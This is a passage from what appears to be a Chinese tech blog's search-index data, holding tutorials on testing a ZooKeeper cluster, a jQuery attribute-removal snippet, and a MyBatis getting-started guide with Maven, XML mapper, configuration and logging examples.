/usr/local/zookeeper-cluster/zookeeper-node-3/logs/version-2 测试集群数据同步测试 连接节点一，并创建文件夹 12345678910# 连接节点一# ./zkCli.sh -server 192.168.1.1:2181# 创建文件夹[zk: 192.168.1.1:2181(CONNECTED) 3] create /test ""Created /test# 查看目录信息[zk: 192.168.1.1:2181(CONNECTED) 4] ls /[zookeeper, test] 此时连接其他任意节点，可以发现 test 文件夹会同步创建，即在任何一个集群节点进行操作，其他集群节点也会同步更新。 123456# 连接节点二# ./zkCli.sh -server 192.168.1.2:2181# 查看目录信息[zk: 192.168.1.2:2181(CONNECTED) 0] ls /[zookeeper, test] 宕机重新选举测试 关闭 Leader（节点二） 1# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop 查看其他节点的状态（节点一、节点三） 12# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status 关闭 Leader（节点二），等待超时时间到了之后，重新查看各个节点的状态，会发现节点三被选举为新的 Leader。 123456789ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: leader 参考博客 Linux 之 Zookeeper 集群搭建 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"JQuery 常用代码块",url:"/posts/b4df07d2.html",text:'选择器删除节点的所有属性1234567891011jQuery.fn.removeAttributes = function() { return this.each(function() { var attributes = $.map(this.attributes, function(item) { return item.name; }); var img = $(this); $.each(attributes, function(i, item) { img.removeAttr(item); }); });} 例如删除 &lt;img&gt; 节点的所有属性，使用示例如下： 1$("img").removeAttributes(); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"MyBatis 入门教程之一",url:"/posts/ed9d29ae.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 前言MyBatis 简介MyBatis 是支持定制化 SQL、存储过程以及高级映射的持久层框架（ORM）。MyBatis 可以使用简单的 XML 或注解用于配置和映射数据表，将 POJO（Plain Old Java Objects，普通的 Java 对象）映射成数据表中的记录。 MyBatis 历史MyBatis 的前身是 Apache 的一个开源项目 iBatis，2010 年这个项目由 Apache Software Foundation 迁移到了 Google Code，并且改名为 MyBatis，最后于 2013 年 11 月 迁移到了 GitHub（至今）。iBATIS 一词来源于 “internet” 和 “abatis” 的组合，是一个基于 Java 的持久层框架。iBATIS 提供的持久层框架包括 SQL Maps 和 Data Access Objects（DAO）。 MyBatis 特点由于单纯的 JDBC 是将 SQL 写在代码块里，耦合度高且维护不易，所以就诞生了 ORM 框架，诸如 Hibernate、Mybatis 等。MyBatis 和 Hibernate 都是 对 JDBC 更加抽象的封装，底层都是 JDBC，这二者的区别在于 MyBatis 是一个半自动的持久化层框架，而 Hibernate 是一个全自动化的持久化层框架。为什么呢？我们知道 Hibernate 是旨在消除 SQL 语句，所以当我们使用 Hibernate 时我们可以不写一条 SQL，全交给框架来处理，但是在实际的开发过程中，针对特定的场景我们是需要自己定制优化 SQL 的，针对于此，Hibernate 提出了 HQL（与标准 SQL 类似，但是倾向于面向对象的风格），为此我们还需要学习下 HQL。而 MyBatis 与 Hibernate 最大的不同就是，MyBatis 是让我们自己编写 SQL 语句。可以看出这两者之间没有绝对的壁垒，如何选择就要视情况来定。更多 MyBatis 相关的资料可阅读 MyBatis 官方中文文档。 持久化层技术对比 JDBC– SQL 写在 Java 代码块里，耦合度高导致硬编码内伤– 维护不易，且实际开发需求中 SQL 往往是经常变化的，频繁修改的情况会经常出现 MyBatis 半自动的持久化框架 容易对 SQL 进行针对性的优化 SQL 和 Java 分开编写，功能边界清晰，一个专注于业务，另一个专注于数据 Hibernate 和 JPA 反射操作太多，导致数据库性能下降– 内部自动生成 SQL，不容易做特殊优化– 长难复杂 SQL 对于 Hibernate 而言处理也不容易– 基于全映射的全自动框架，拥有大量字段的 POJO 进行部分映射时比较困难，导致数据库性能下降 快速入门本节会介绍如何开发第一个 MyBatis 应用，所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-1。 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;properties&gt; &lt;jdk.version&gt;1.8&lt;/jdk.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;slf4j.version&gt;1.7.30&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mybatis.version&gt;3.5.6&lt;/mybatis.version&gt; &lt;mybatis-generator&gt;1.4.0&lt;/mybatis-generator&gt; &lt;mysql-connector.version&gt;8.0.23&lt;/mysql-connector.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;${mybatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql-connector.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;${mybatis-generator}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 创建 Maven 子模块工程在 Maven 子模块的 pom.xml 中引入以下依赖 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;artifactId&gt;mybatis-lesson-1&lt;/artifactId&gt;&lt;name&gt;mybatis-lesson-1&lt;/name&gt;&lt;parent&gt; &lt;groupId&gt;com.clay.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-share&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 在 Maven 子模块中创建实体类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.clay.mybatis.bean;public class Employee { private Long id; private String lastName; private String gender; private String email; public Long getId() { return id; } public void setId(Long id) { this.id = id; } public String getLastName() { return lastName; } public void setLastName(String lastName) { this.lastName = lastName; } public String getGender() { return gender; } public void setGender(String gender) { this.gender = gender; } public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } @Override public String toString() { return this.id + "_" + this.lastName + "_" + this.gender + "_" + this.email; }} 在 Maven 子模块中创建 SQL 映射文件，主要内容是在命名空间 com.clay.mybatis.mapper.EmployeeMapper 中定义了一个名为 selectEmployee 的映射语句，这样就可以在 Java 代码中使用全限定名 com.clay.mybatis.mapper.EmployeeMapper.selectEmployee 来调用唯一的 SQL 映射语句 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- 指定命名空间 --&gt;&lt;mapper namespace="com.clay.mybatis.mapper.EmployeeMapper"&gt; &lt;select id="selectEmployee" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 提示 当 Java Bean 的属性名与表字段名不一样时，在 SQL 中需要使用字段别名来映射。例如上面 last_name 字段的别名是 lastName，前者是表字段的名称，后者是 Java Bean 属性的名称。 在 Maven 子模块中的 src/main/resources 目录下创建 db.properties 配置文件，其中包含了连接 MySQL 数据库所需的基础信息 1234dataSource.user=rootdataSource.password=123456dataSource.driverClass=com.mysql.cj.jdbc.DriverdataSource.jdbcUrl=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC 在 Maven 子模块中的 src/main/resources 目录下创建 log4j.properties 配置文件，利用 Log4j 打印 MyBatis 的 SQL 语句 1234567891011121314151617181920212223242526log4j.rootLogger = DEBUG,console### 输出到控制台 ###log4j.appender.console = org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target = System.outlog4j.appender.console.layout = org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern = %d{ABSOLUTE} %5p %c{1}:%L - %m%n### 输出到日志文件 ###log4j.appender.file = org.apache.log4j.DailyRollingFileAppenderlog4j.appender.file.File = ${uplat.root}/WEB-INF/logs/platform.loglog4j.appender.file.DatePattern=_yyyyMMdd\'.log\'#log4j.appender.file.Append = true#log4j.appender.file.Threshold = INFOlog4j.appender.file.layout = org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern =%-d{yyyy-MM-dd HH\\:mm\\:ss} [ %t\\:%r ] - [ %p ] %m%n### 打印MyBatis的SQL ####log4j.logger.com.ibatis=DEBUG#log4j.logger.com.ibatis.common.jdbc.SimpleDataSource=DEBUG#log4j.logger.com.ibatis.common.jdbc.ScriptRunner=DEBUG#log4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate=DEBUGlog4j.logger.java.sql.Connection=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUG#log4j.logger.java.sql.ResultSet=DEBUG 在 Maven 子模块中的 src/main/resources 目录下创建 MyBatis 的主配置文件 mybatis-config.xml，其中包含了 MyBatis 的核心设置，包括获取数据库连接实例的数据源（DataSource）、决定事务作用域和控制方式的事务管理器（TransactionManager）以及注册 SQL 映射文件 123456789101112131415161718192021222324252627&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;!-- 读取db.properties文件 --&gt; &lt;properties resource="db.properties" /&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;!-- 配置事务 --&gt; &lt;transactionManager type="JDBC" /&gt; &lt;!-- 配置数据源 --&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="url" value="${dataSource.jdbcUrl}" /&gt; &lt;property name="username" value="${dataSource.user}" /&gt; &lt;property name="password" value="${dataSource.password}" /&gt; &lt;property name="driver" value="${dataSource.driverClass}" /&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;!-- SQL映射文件 --&gt; &lt;mappers&gt; &lt;mapper resource="com/clay/mybatis/dao/EmployeeMapper.xml" /&gt; &lt;/mappers&gt;&lt;/configuration&gt; 在 Maven 子模块中创建主启动类，每个基于 MyBatis 的应用都是以一个 SqlSessionFactory 的实例为核心的，SqlSessionFactory 的实例可以通过 SqlSessionFactoryBuilder 获得。而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先配置的 Configuration 实例来构建出 SqlSessionFactory 实例。从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。但也可以使用任意的输入流（InputStream）实例，比如用文件路径字符串或 file:// URL 构造的输入流。MyBatis 提供了一个名叫 Resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。 123456789101112131415161718192021222324252627282930313233package com.clay.mybatis;import com.clay.mybatis.bean.Employee;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import java.io.IOException;import java.io.InputStream;public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // 使用SqlSession实例，通过全限定名直接执行已经映射的SQL语句，参数说明如下： // 1) 全限定名（SQL映射文件中的命名空间 + id）：statement Unique identifier matching the statement to use. // 2) 执行SQL所需的参数：parameter A parameter object to pass to the statement. Employee employee = session.selectOne("com.clay.mybatis.mapper.EmployeeMapper.selectEmployee", 1); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} MySQL 数据库初始化在 MySQL 里执行以下 SQL 语句创建数据库与数据库表，并插入测试数据 1234567891011CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee values(null, \'Jim\',\'1\', \'jim@gmail.com\'); 工程的目录结构12345678910111213141516171819202122mybatis-share├── mybatis-lesson-1│&nbsp;&nbsp; ├── pom.xml│&nbsp;&nbsp; └── src│&nbsp;&nbsp; ├── main│&nbsp;&nbsp; │&nbsp;&nbsp; ├── java│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── com│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── clay│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── mybatis│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── bean│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── Employee.java│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── dao│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── EmployeeMapper.xml│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── MyBatisApplication.java│&nbsp;&nbsp; │&nbsp;&nbsp; └── resources│&nbsp;&nbsp; │&nbsp;&nbsp; ├── db.properties│&nbsp;&nbsp; │&nbsp;&nbsp; ├── log4j.properties│&nbsp;&nbsp; │&nbsp;&nbsp; └── mybatis-config.xml│&nbsp;&nbsp; └── test│&nbsp;&nbsp; └── java├── pom.xml└── README.md 代码测试执行主启动类 MyBatisApplication 的 main() 方法，若打印出以下日志信息，则说明 MyBatis 应用正常运行 12345678910111213141521:47:20,509 DEBUG LogFactory:105 - Logging initialized using \'class org.apache.ibatis.logging.slf4j.Slf4jImpl\' adapter.21:47:20,550 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,550 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,551 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,551 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,648 DEBUG JdbcTransaction:137 - Opening JDBC Connection21:47:20,997 DEBUG PooledDataSource:434 - Created connection 1564984895.21:47:20,998 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,005 DEBUG selectEmployee:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?21:47:21,058 DEBUG selectEmployee:137 - ==&gt; Parameters: 1(Integer)21:47:21,097 DEBUG selectEmployee:137 - &lt;== Total: 11_Jim_1_jim@gmail.com21:47:21,098 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,099 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,099 DEBUG PooledDataSource:391 - Returned connection 1564984895 to pool. 面向接口编程在上面入门案例的 SQL 映射文件中，由于在命名空间 com.clay.mybatis.mapper.EmployeeMapper 里定义了一个名为 selectEmployee 的映射语句，这样就可以在 Java 代码中使用全限定名 com.clay.mybatis.mapper.EmployeeMapper.selectEmployee 来调用唯一的 SQL 映射语句，如下所示： 1Employee employee = session.selectOne("com.clay.mybatis.mapper.EmployeeMapper.selectEmployee", 1); MyBatis 另外还提供了一种面向接口的编程方式，可以直接映射到在命名空间中同名的映射器类（Mapper 类），并将已映射的 SQL 语句匹配到对应名称、参数和返回类型的方法。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-2。 第一步：创建 Mapper 接口类（映射器类） 123456789package com.clay.mybatis.dao;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper { public Employee getById(Long id);} 第二步：在 SQL 映射文件中，指定命名空间为 Mapper 接口类的全类名，同时指定 id 的属性值为 Mapper 接口类的方法名 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- 指定命名空间为Mapper接口类的全类名 --&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 第三步：通过 Mapper 接口类实现增删改查操作，值得一提的是，MyBatis 会为每个 Mapper 接口类自动创建一个代理对象（将 Mapper 接口类与 SQL 映射文件绑定在一起），最后由代理对象去执行增删改查方法 1234567891011121314151617181920public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // MyBatis会自动创建一个代理对象，由代理对象去执行增删改查方法 EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getById(1L); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} 第四步：执行主启动类 MyBatisApplication 的 main() 方法，若打印出以下日志信息，则说明 MyBatis 应用正常运行 12345678910111213141522:13:27,834 DEBUG LogFactory:105 - Logging initialized using \'class org.apache.ibatis.logging.slf4j.Slf4jImpl\' adapter.22:13:27,872 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,872 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,873 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,873 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,993 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:13:28,262 DEBUG PooledDataSource:434 - Created connection 27319466.22:13:28,262 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,266 DEBUG getById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:13:28,304 DEBUG getById:137 - ==&gt; Parameters: 1(Long)22:13:28,330 DEBUG getById:137 - &lt;== Total: 11_Jim_1_jim@gmail.com22:13:28,331 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,331 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,332 DEBUG PooledDataSource:391 - Returned connection 27319466 to pool. 你可能会注意到，这种方式和用全限定名调用 Java 对象的方法类似。这样，该命名就可以直接映射到在命名空间中同名的映射器类，并将已映射的 select 语句匹配到对应名称、参数和返回类型的方法。因此你就可以像上面那样，不费吹灰之力地在对应的映射器接口调用方法。第二种方式有很多优势，首先它不依赖于字符串字面值，会更安全一点；其次，如果你的 IDE 有代码补全功能，那么代码补全可以帮你快速选择到映射好的 SQL 语句。 进阶使用命名空间在之前版本的 MyBatis 中，命名空间（Namespaces）的作用并不大，是可选的。但现在，随着命名空间越发重要，必须指定命名空间。命名空间的作用有两个，一个是利用更长的全限定名来将不同的语句隔离开来，同时也为了实现接口绑定。就算你觉得暂时用不到接口绑定，你也应该遵循这里的规定，以防哪天你改变了主意。长远来看，只要将命名空间置于合适的 Java 包命名空间之中，你的代码会变得更加整洁，也有利于你更方便地使用 MyBatis。 为了减少输入量，MyBatis 对所有具有名称的配置元素（包括语句，结果映射，缓存等）使用了如下的命名解析规则： 全限定名：比如 com.mypackage.MyMapper.selectAllThings，将被直接用于查找及使用 短名称：比如 selectAllThings，如果该名称全局唯一也可以作为一个单独的引用。如果不唯一，有两个或两个以上的相同名称（比如 com.foo.selectAllThings 和 com.bar.selectAllThings），那么使用时就会产生短名称不唯一的错误，这种情况下就必须使用全限定名 对于像 EmployeeMapper 这样的映射器类来说，还有另一种方法来完成语句映射。它们映射的语句可以不用 XML 来配置，而可以使用 Java 注解来配置。比如，上面的 XML 入门示例可以被替换成如下的配置： 12345678910package com.clay.mybatis.dao;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper { @Select("select id, last_name as lastName, gender, email from t_employee where id = #{id}") public Employee getById(Long id);} 使用注解来映射简单语句会使代码显得更加简洁，但对于稍微复杂一点的语句，Java 注解不仅力不从心，还会让你本就复杂的 SQL 语句更加混乱不堪。 因此，如果你需要做一些很复杂的操作，最好用 XML 来映射语句。选择何种方式来配置映射，以及认为是否应该要统一映射语句定义的形式，完全取决于你和你的团队。换句话说，永远不要拘泥于一种方式，你可以很轻松的在基于注解和 XML 的语句映射方式间自由移植和切换。 作用域（Scope）和生命周期理解不同作用域和生命周期类别是至关重要的，因为错误的使用会导致非常严重的并发问题。依赖注入框架可以创建线程安全的、基于事务的 SqlSession 和映射器，并将它们直接注入到你的 Bean 中，因此可以直接忽略它们的生命周期。如果对如何通过依赖注入框架使用 MyBatis 感兴趣，可以研究一下 MyBatis-Spring 或 MyBatis-Guice 这两个子项目。 SqlSessionFactoryBuilder这个类可以被实例化、使用和丢弃，一旦创建了 SqlSessionFactory，就不再需要它了。 因此 SqlSessionFactoryBuilder 实例的最佳作用域是方法作用域（也就是局部方法变量）。你可以重用 SqlSessionFactoryBuilder 来创建多个 SqlSessionFactory 实例，但最好还是不要一直保留着它，以保证所有的 XML 解析资源可以被释放给更重要的事情。 SqlSessionFactorySqlSessionFactory 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。使用 SqlSessionFactory 的最佳实践是在应用运行期间不要重复创建多次，多次重建 SqlSessionFactory 被视为一种代码 坏习惯。因此 SqlSessionFactory 的最佳作用域是应用作用域。有很多方法可以做到，最简单的就是使用单例模式或者静态单例模式。 SqlSession每个线程都应该有它自己的 SqlSession 实例。SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。绝对不能将 SqlSession 实例的引用放在一个类的静态域，甚至一个类的实例变量也不行。也绝不能将 SqlSession 实例的引用放在任何类型的托管作用域中，比如 Servlet 框架中的 HttpSession。如果你现在正在使用一种 Web 框架，可以考虑将 SqlSession 放在一个和 HTTP 请求相似的作用域中。换句话说，每次收到 HTTP 请求，就可以打开一个 SqlSession，返回一个响应后就关闭它。这个关闭操作很重要，为了确保每次都能执行关闭操作，你应该把这个关闭操作放到 finally 块中。下面的示例就是一个确保 SqlSession 关闭的标准代码： 123try (SqlSession session = sqlSessionFactory.openSession()) { // 应用逻辑代码} 或者 12345678SqlSession session = sqlSessionFactory.openSession();try { // 应用逻辑代码} finally { if (session != null) { session.close(); }} 在所有代码中都遵循这种使用模式，可以保证所有数据库资源都能被正确地关闭。 映射器实例映射器是一些绑定映射语句的接口。映射器接口的实例是从 SqlSession 中获得的，虽然从技术层面上来讲，任何映射器实例的最大作用域与请求它们的 SqlSession 相同。但方法作用域才是映射器实例的最合适的作用域。也就是说，映射器实例应该在调用它们的方法中被获取，使用完毕之后即可丢弃。映射器实例并不需要被显式地关闭，尽管在整个请求作用域保留映射器实例不会有什么问题，但是你很快会发现，在这个作用域上管理太多像 SqlSession 的资源会让你忙不过来。因此，最好将映射器放在方法作用域内，就像下面的例子一样： 1234try (SqlSession session = sqlSessionFactory.openSession()) { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); // 应用逻辑代码} 不使用 XML 构建 SqlSessionFactory如果你更愿意直接从 Java 代码而不是 XML 文件中创建配置，或者想要创建你自己的配置建造器，MyBatis 也提供了完整的配置类，提供了所有与 XML 文件等价的配置项。 123456DataSource dataSource = BlogDataSourceFactory.getBlogDataSource();TransactionFactory transactionFactory = new JdbcTransactionFactory();Environment environment = new Environment("development", transactionFactory, dataSource);Configuration configuration = new Configuration(environment);configuration.addMapper(EmployeeMapper.class);SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration); 注意该例中，Configuration 添加了一个映射器类（Mapper Class）。映射器类是 Java 类，它们包含 SQL 映射注解从而避免依赖 XML 文件。不过，由于 Java 注解的一些限制以及某些 MyBatis 映射的复杂性，要使用大多数高级映射（比如：嵌套联合映射），仍然需要使用 XML 配置。有鉴于此，如果存在一个同名 SQL 映射文件（XML），MyBatis 会自动查找并加载它；在这个例子中，基于类路径和 EmployeeMapper.class 的类名，会加载 EmployeeMapper.xml。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Linux 单机搭建 Zookeeper 集群",url:"/posts/98827cf0.html",text:'前言本文适用于在 Centos/Debian/Ubuntu 等 Linux 发行版系统上，使用单机搭建 Zookeeper 集群。 Zookeeper 简介Zookeeper 